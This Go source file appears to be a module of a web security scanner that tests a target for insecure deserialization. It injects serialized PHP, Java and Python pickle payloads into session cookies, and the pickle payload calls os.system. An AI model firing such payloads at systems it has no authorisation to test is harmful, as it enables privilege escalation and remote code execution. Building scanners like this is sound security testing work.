package modules

import (
	"context"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// InsecureDeserializationTestingResult holds the result of the InsecureDeserializationTesting module execution.
type InsecureDeserializationTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// InsecureDeserializationTesting executes the insecure_deserialization_testing security technique.
type InsecureDeserializationTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []InsecureDeserializationTestingResult
	client     *http.Client
}

// NewInsecureDeserializationTesting creates a new instance.
func NewInsecureDeserializationTesting(target string) *InsecureDeserializationTesting {
	return &InsecureDeserializationTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *InsecureDeserializationTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

type deserializationPayload struct {
	name    string
	payload string
	cookie  string
}

var desPayloads = []deserializationPayload{
	{"PHP Object", `O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}`, "session"},
	{"Java Magic Byte", "rO0ABXNyAApzZXJpYWxpemVk", "JSESSIONID"}, // Base64 of Java magic bytes AC ED 00 05
	{"Python Pickle", "gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJoaZGUhZRSlC4=", "session"},
}

func (m *InsecureDeserializationTesting) Execute(ctx context.Context) ([]InsecureDeserializationTestingResult, error) {
	m.results = make([]InsecureDeserializationTestingResult, 0)

	jobs := make(chan deserializationPayload, len(desPayloads))
	for _, p := range desPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *InsecureDeserializationTesting) testPayload(ctx context.Context, p deserializationPayload) {
	req, err := http.NewRequestWithContext(ctx, "GET", m.Target, nil)
	if err != nil {
		return
	}

	// Inject serialized object into a common session cookie
	req.AddCookie(&http.Cookie{Name: p.cookie, Value: p.payload})

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	// Check for deserialization stack traces or errors
	if strings.Contains(bodyStr, "java.io.ObjectInputStream") ||
		strings.Contains(bodyStr, "unserialize(): Error") ||
		strings.Contains(bodyStr, "_pickle.UnpicklingError") {
		m.mu.Lock()
		m.results = append(m.results, InsecureDeserializationTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Insecure deserialization vulnerability detected using " + p.name,
		})
		m.mu.Unlock()
	}
}
